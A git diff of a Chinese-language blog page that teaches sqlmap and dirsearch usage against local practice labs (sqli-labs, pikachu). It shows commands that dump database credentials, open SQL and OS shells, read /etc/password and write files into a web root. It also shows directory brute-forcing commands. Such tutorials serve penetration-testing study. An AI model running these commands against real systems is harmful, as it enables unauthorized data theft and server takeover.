@@ -255,12 +255,12 @@
         </center>
     </div>
     <div class="content-article">
-        <h1 id="Sqlmap使用（必备命令）"><a href="#Sqlmap使用（必备命令）" class="headerlink" title="Sqlmap使用（必备命令）"></a>Sqlmap使用（必备命令）</h1><h2 id="一、Sqlmap注入篇"><a href="#一、Sqlmap注入篇" class="headerlink" title="一、Sqlmap注入篇"></a>一、Sqlmap注入篇</h2><p>Sqlmap是一个专业的SQL注入工具，用法也很多，具体可以用”sqlmap -hh”查看完整的命令帮助文档，这只是一些最常用的Sqlmap用法。</p>
-<h4 id="1、检查注入点"><a href="#1、检查注入点" class="headerlink" title="1、检查注入点"></a>1、检查注入点</h4><p>【get】  sqlmap -u  “url” </p>
+        <h1><span id="sqlmap使用必备命令">Sqlmap使用（必备命令）</span></h1><h2><span id="一-sqlmap注入篇">一、Sqlmap注入篇</span></h2><p>Sqlmap是一个专业的SQL注入工具，用法也很多，具体可以用”sqlmap -hh”查看完整的命令帮助文档，这只是一些最常用的Sqlmap用法。</p>
+<h4><span id="1-检查注入点">1、检查注入点</span></h4><p>【get】  sqlmap -u  “url” </p>
 <p>【post】sqlmap -u “url” –data&#x3D;”参数”</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“</p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1">http://192.168.2.64/sqli/Less-1</a>“ –data&#x3D;”id&#x3D;1”</p>
-<h4 id="2、爆所有数据库信息"><a href="#2、爆所有数据库信息" class="headerlink" title="2、爆所有数据库信息"></a>2、爆所有数据库信息</h4><p>  –dbs（爆所有数据库信息）</p>
+<h4><span id="2-爆所有数据库信息">2、爆所有数据库信息</span></h4><p>  –dbs（爆所有数据库信息）</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –dbs</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102095201893.png" alt="image-20240102095201893"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15/">http://192.168.2.64/sqli/Less-15/</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –dbs</p>
@@ -270,24 +270,24 @@
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102102853481.png" alt="image-20240102102853481"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1">http://192.168.2.64/sqli/Less-1</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –current-db</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102195900440.png" alt="image-20240102195900440"></p>
-<h4 id="3、列出指定数据库所有的表名"><a href="#3、列出指定数据库所有的表名" class="headerlink" title="3、列出指定数据库所有的表名"></a>3、列出指定数据库所有的表名</h4><p>  -D 数据库名  –tables</p>
+<h4><span id="3-列出指定数据库所有的表名">3、列出指定数据库所有的表名</span></h4><p>  -D 数据库名  –tables</p>
 <p>  例如：列出数据库名为security的所有数据表</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ -D security –tables</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200041636.png" alt="image-20240102200041636"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security –tables</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200529965.png" alt="image-20240102200529965"></p>
-<h4 id="4、列出指定表名的所有列名"><a href="#4、列出指定表名的所有列名" class="headerlink" title="4、列出指定表名的所有列名"></a>4、列出指定表名的所有列名</h4><p>  –columns 所有列名</p>
+<h4><span id="4-列出指定表名的所有列名">4、列出指定表名的所有列名</span></h4><p>  –columns 所有列名</p>
 <p>  例如：数据库pikachu中users表所有字段名</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ -D security -T users –columns</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200729513.png" alt="image-20240102200729513"></p>
 <p>因为图一样，后面只列一个图。</p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security -T users –columns</p>
-<h4 id="5、dump打印输出表名指定列名字段的值数据"><a href="#5、dump打印输出表名指定列名字段的值数据" class="headerlink" title="5、dump打印输出表名指定列名字段的值数据"></a>5、dump打印输出表名指定列名字段的值数据</h4><p>  -C 指定需要显示数值的字段名，不指定默认显示全部字段</p>
+<h4><span id="5-dump打印输出表名指定列名字段的值数据">5、dump打印输出表名指定列名字段的值数据</span></h4><p>  -C 指定需要显示数值的字段名，不指定默认显示全部字段</p>
 <p>  例如：数据库pikachu中users表中username,password字段的值</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ -D security -T users -C username,password –dump</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200855339.png" alt="image-20240102200855339"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security -T users -C username,password –dump</p>
-<h4 id="6、Sqlmap-r-使用"><a href="#6、Sqlmap-r-使用" class="headerlink" title="6、Sqlmap -r 使用"></a>6、Sqlmap -r 使用</h4><p>使用Fiddler或者Burp Suite抓包将get或者post请求保存为.txt文件，然后使用Sqlmap -r “txt文件路径”调用，这样就不用输入参数和cookie了。</p>
+<h4><span id="6-sqlmap-r-使用">6、Sqlmap -r 使用</span></h4><p>使用Fiddler或者Burp Suite抓包将get或者post请求保存为.txt文件，然后使用Sqlmap -r “txt文件路径”调用，这样就不用输入参数和cookie了。</p>
 <p>例如：登录成功后修改个人信息POST请求存在sql注入，将该post请求拦截后保存.txt文件，就不需要在Sqlmap中输入参数和cookie。</p>
 <p>20.txt</p>
 <p><strong>GET</strong> &#x2F;sqli&#x2F;Less-20&#x2F;index.php <strong>HTTP&#x2F;1.1</strong></p>
@@ -305,10 +305,10 @@
 <p>如果将20.txt放到其它目录例如：</p>
 <p>根目录&#x2F;创建tiansqlmap目录来专门保存sql注入的.txt文件，使用方法-r “路径”</p>
 <p>root@kalitian:&#x2F;# sqlmap -r “&#x2F;tiansqlmap&#x2F;20.txt”　　</p>
-<h4 id="7、Sqlmap-m-“批量扫描-txt”"><a href="#7、Sqlmap-m-“批量扫描-txt”" class="headerlink" title="7、Sqlmap -m  “批量扫描.txt”"></a>7、Sqlmap -m  “批量扫描.txt”</h4><p>批量url.txt放到–&gt;&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt</p>
+<h4><span id="7-sqlmap-m-批量扫描txt">7、Sqlmap -m  “批量扫描.txt”</span></h4><p>批量url.txt放到–&gt;&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt</p>
 <p>root@kalitian:~# sqlmap -m “&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt” –smart –batch –level 5</p>
-<h4 id="8、Sqlmap-其它参数"><a href="#8、Sqlmap-其它参数" class="headerlink" title="8、Sqlmap 其它参数"></a>8、Sqlmap 其它参数</h4><p>–threads 10 &#x2F;&#x2F;sqlmap线程最高设置为10<br>–level 3 &#x2F;&#x2F;sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5<br>–risk 3 &#x2F;&#x2F; 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>
-<h2 id="二、Sqlmap用户权限"><a href="#二、Sqlmap用户权限" class="headerlink" title="二、Sqlmap用户权限"></a>二、Sqlmap用户权限</h2><h4 id="1、列出数据库管理系统用户"><a href="#1、列出数据库管理系统用户" class="headerlink" title="1、列出数据库管理系统用户"></a>1、列出数据库管理系统用户</h4><p>  –users  列出数据库系统用户</p>
+<h4><span id="8-sqlmap-其它参数">8、Sqlmap 其它参数</span></h4><p>–threads 10 &#x2F;&#x2F;sqlmap线程最高设置为10<br>–level 3 &#x2F;&#x2F;sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5<br>–risk 3 &#x2F;&#x2F; 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>
+<h2><span id="二-sqlmap用户权限">二、Sqlmap用户权限</span></h2><h4><span id="1-列出数据库管理系统用户">1、列出数据库管理系统用户</span></h4><p>  –users  列出数据库系统用户</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –users</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102203706699.png" alt="image-20240102203706699"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –users</p>
@@ -316,41 +316,41 @@
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –current-user</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102203904785.png" alt="image-20240102203904785"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –current-user</p>
-<h4 id="2、判断当前用户是否是DBA"><a href="#2、判断当前用户是否是DBA" class="headerlink" title="2、判断当前用户是否是DBA"></a>2、判断当前用户是否是DBA</h4><p>  –is-dba 是否是DBA</p>
+<h4><span id="2-判断当前用户是否是dba">2、判断当前用户是否是DBA</span></h4><p>  –is-dba 是否是DBA</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –is-dba</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102204032260.png" alt="image-20240102204032260"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit”  –is-dba</p>
-<h4 id="3、查看用户权限"><a href="#3、查看用户权限" class="headerlink" title="3、查看用户权限"></a>3、查看用户权限</h4><p>  –privileges  查看用户权限</p>
+<h4><span id="3-查看用户权限">3、查看用户权限</span></h4><p>  –privileges  查看用户权限</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –privileges</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102205105524.png" alt="image-20240102205105524"></p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit”  –privileges</p>
 <p> –privileges -U 指定用户名查看</p>
-<h2 id="三、Sqlmap文件操作与shell提权篇"><a href="#三、Sqlmap文件操作与shell提权篇" class="headerlink" title="三、Sqlmap文件操作与shell提权篇"></a>三、Sqlmap文件操作与shell提权篇</h2><h4 id="1、sql-shell"><a href="#1、sql-shell" class="headerlink" title="1、sql shell"></a>1、sql shell</h4><p>  –sql-shell  进入sql-shell交互</p>
+<h2><span id="三-sqlmap文件操作与shell提权篇">三、Sqlmap文件操作与shell提权篇</span></h2><h4><span id="1-sql-shell">1、sql shell</span></h4><p>  –sql-shell  进入sql-shell交互</p>
 <p>  这里通过sqlmap可以直接获取一个sql shell，直接执行sql语句进行交互。</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –sql-shell</p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –sql-shell</p>
 <p>  进入sql-shell交互：</p>
 <p>注意：这里由于进入了sql shell可以执行sql语句了，也可以用 load data infile、load_file、into outfile等函数来进行文件读取或写入。</p>
-<h4 id="2、cmd-shell"><a href="#2、cmd-shell" class="headerlink" title="2、cmd shell"></a>2、cmd shell</h4><p>  –os-shell 进入cmd shell交互</p>
+<h4><span id="2-cmd-shell">2、cmd shell</span></h4><p>  –os-shell 进入cmd shell交互</p>
 <p>  这里通过sqlmap可以直接获取一个cmd shell，直接执行cmd命令进行交互。</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –os-shell</p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –os-shell</p>
-<h4 id="3、读取服务器上指定文件"><a href="#3、读取服务器上指定文件" class="headerlink" title="3、读取服务器上指定文件"></a>3、读取服务器上指定文件</h4><p>  –file-read &#x3D; 需要读取文件路径<br>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –file-read&#x3D;&#x2F;etc&#x2F;password</p>
+<h4><span id="3-读取服务器上指定文件">3、读取服务器上指定文件</span></h4><p>  –file-read &#x3D; 需要读取文件路径<br>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –file-read&#x3D;&#x2F;etc&#x2F;password</p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –file-read&#x3D;d:&#x2F;text.txt</p>
-<h4 id="4、写入本地文件到服务器上"><a href="#4、写入本地文件到服务器上" class="headerlink" title="4、写入本地文件到服务器上"></a>4、写入本地文件到服务器上</h4><p>  –file-write &#x2F;test&#x2F;test.txt –file-dest 本地文件路径</p>
+<h4><span id="4-写入本地文件到服务器上">4、写入本地文件到服务器上</span></h4><p>  –file-write &#x2F;test&#x2F;test.txt –file-dest 本地文件路径</p>
 <p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</p>
 <p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</p>
-<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>dirsearch是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p>
+<h1><span id="dirsearch">dirsearch</span></h1><h3><span id="介绍">介绍</span></h3><p>dirsearch是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p>
 <p>dirsearch下载地址： GitHub - maurosoria&#x2F;dirsearch: Web path scanner</p>
 <p>运行环境：必须安装python3.7或更高版本</p>
-<h3 id="一、Dirsearch是什么？"><a href="#一、Dirsearch是什么？" class="headerlink" title="一、Dirsearch是什么？"></a>一、Dirsearch是什么？</h3><p>Dirsearch是一个用于探测WEB服务器下的敏感文件&#x2F;目录的命令行工具。</p>
-<h3 id="二、安装和使用"><a href="#二、安装和使用" class="headerlink" title="二、安装和使用"></a>二、安装和使用</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p>选择以下安装选项之一：</p>
+<h3><span id="一-dirsearch是什么">一、Dirsearch是什么？</span></h3><p>Dirsearch是一个用于探测WEB服务器下的敏感文件&#x2F;目录的命令行工具。</p>
+<h3><span id="二-安装和使用">二、安装和使用</span></h3><h4><span id="1安装">1.安装</span></h4><p>选择以下安装选项之一：</p>
 <p>使用 git 安装：（推荐git clone <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch.git">https://github.com/maurosoria/dirsearch.git</a> –depth 1)<br>使用 ZIP 文件安装：在此处下载<br>使用 Docker 安装：（更多信息可以在这里找到docker build -t “dirsearch:v0.4.3” .)<br>使用 PyPi 安装：或pip3 install dirsearchpip install dirsearch<br>使用 Kali Linux 安装：（已弃用）sudo apt-get install dirsearch</p>
 <p>下载zip包，解压后进入控制台，输入下面命令进行安装依赖：</p>
 <p>pip3 install -r requirements.txt        &#x2F;&#x2F;安装依赖</p>
 <p> python dirsearch.py -h    &#x2F;&#x2F;查看帮助</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240107193349297.png" alt="image-20240107193349297"></p>
-<h2 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h2><p>命令总结：</p>
+<h2><span id="三-使用方法">三、使用方法</span></h2><p>命令总结：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cobol">dirsearch -e php,txt,zip -u https://target     //简单的查看网址目录和文件<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt        //使用文件拓展名为php,txt,zip的字典扫描目标url<br>python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt -t 20<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --random-agents<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --json-report=reports/target.json<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --simple-report=reports/target-paths.txt<br><br>dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --plain-text-report=reports/target-paths-and-status.js<br></code></pre></td></tr></table></figure>
 
 <p>dirsearch -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a>        &#x2F;&#x2F;日常使用</p>
@@ -418,6 +418,12 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/">sqli通关</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
                 </span>
             </li>
@@ -470,12 +476,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -494,7 +494,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/02/Linux%E5%91%BD%E4%BB%A4/">Linux命令</a>
+                    <a href="/2023/12/22/python3/">python3</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/11/python%E5%AD%A6%E4%B9%A02/">python学习2</a>
                 </span>
             </li>
             
@@ -506,25 +512,31 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/06/html%E5%92%8Ccss%E5%AD%A6%E4%B9%A0/">html和css学习</a>
+                    <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/12/php%E5%AD%A6%E4%B9%A0/">php学习</a>
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+                    <a href="/2024/01/04/virtual%E5%92%8Cpicachu/">virtual和pikachu</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2024/01/01/sqlmap/">sqlmap</a>
+                    <a href="/2024/01/01/waf%E5%92%8CBP/">waf和BP</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
                 </span>
             </li>
             
@@ -536,19 +548,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2024/01/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E5%92%8C%E9%9D%B6%E6%9C%BA/">渗透和靶机</a>
+                    <a href="/2023/12/10/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/">安卓病毒监听</a>
                 </span>
             </li>
             
@@ -581,97 +581,97 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/Linux/" style="font-size: 18.87902322439171px;" class="tag-cloud-link">Linux</a>
+    <a href="/tags/Linux/" style="font-size: 16.508466125821823px;" class="tag-cloud-link">Linux</a>
     
-    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 14.243156831119453px;" class="tag-cloud-link">基础知识</a>
+    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 19.393828668272963px;" class="tag-cloud-link">基础知识</a>
     
-    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 12.679833972392228px;" class="tag-cloud-link">DNS域名解析</a>
+    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 19.94434555020605px;" class="tag-cloud-link">DNS域名解析</a>
     
-    <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 9.197280880713667px;" class="tag-cloud-link">学习</a>
+    <a href="/tags/HTML/" style="font-size: 9.590587386042355px;" class="tag-cloud-link">HTML</a>
     
-    <a href="/tags/HTML/" style="font-size: 18.636601824575106px;" class="tag-cloud-link">HTML</a>
+    <a href="/tags/CSS/" style="font-size: 17.72590884711928px;" class="tag-cloud-link">CSS</a>
     
-    <a href="/tags/CSS/" style="font-size: 14.699492157719106px;" class="tag-cloud-link">CSS</a>
+    <a href="/tags/php/" style="font-size: 19.517899188104806px;" class="tag-cloud-link">php</a>
     
-    <a href="/tags/php/" style="font-size: 13.094709400071846px;" class="tag-cloud-link">php</a>
+    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 18.92775129481995px;" class="tag-cloud-link">php函数</a>
     
-    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 16.566844458731804px;" class="tag-cloud-link">php函数</a>
+    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 13.207231355045472px;" class="tag-cloud-link">简单网站功能实现</a>
     
-    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 12.986675292515839px;" class="tag-cloud-link">简单网站功能实现</a>
+    <a href="/tags/html/" style="font-size: 19.184123187050712px;" class="tag-cloud-link">html</a>
     
-    <a href="/tags/PHP/" style="font-size: 17.762155127978325px;" class="tag-cloud-link">PHP</a>
+    <a href="/tags/postman/" style="font-size: 9.142673398918873px;" class="tag-cloud-link">postman</a>
     
-    <a href="/tags/Navicat/" style="font-size: 14.991613650788793px;" class="tag-cloud-link">Navicat</a>
+    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 10.868800348392908px;" class="tag-cloud-link">文件操作</a>
     
-    <a href="/tags/%E5%AE%89%E8%A3%85/" style="font-size: 12.90948273530238px;" class="tag-cloud-link">安装</a>
+    <a href="/tags/python/" style="font-size: 12.833651436327315px;" class="tag-cloud-link">python</a>
     
-    <a href="/tags/html/" style="font-size: 16.86593425676537px;" class="tag-cloud-link">html</a>
+    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 12.295475491638747px;" class="tag-cloud-link">变量</a>
     
-    <a href="/tags/postman/" style="font-size: 17.14070666557223px;" class="tag-cloud-link">postman</a>
+    <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 14.44185167819202px;" class="tag-cloud-link">字符串</a>
     
-    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 8.769612928572597px;" class="tag-cloud-link">文件操作</a>
+    <a href="/tags/%E5%88%97%E8%A1%A8/" style="font-size: 10.466028546923202px;" class="tag-cloud-link">列表</a>
     
-    <a href="/tags/python/" style="font-size: 9.270694422200746px;" class="tag-cloud-link">python</a>
+    <a href="/tags/%E5%85%83%E7%BB%84/" style="font-size: 11.282660461639718px;" class="tag-cloud-link">元组</a>
     
-    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 9.040648623920116px;" class="tag-cloud-link">变量</a>
+    <a href="/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/" style="font-size: 11.047271540121272px;" class="tag-cloud-link">if条件判断</a>
     
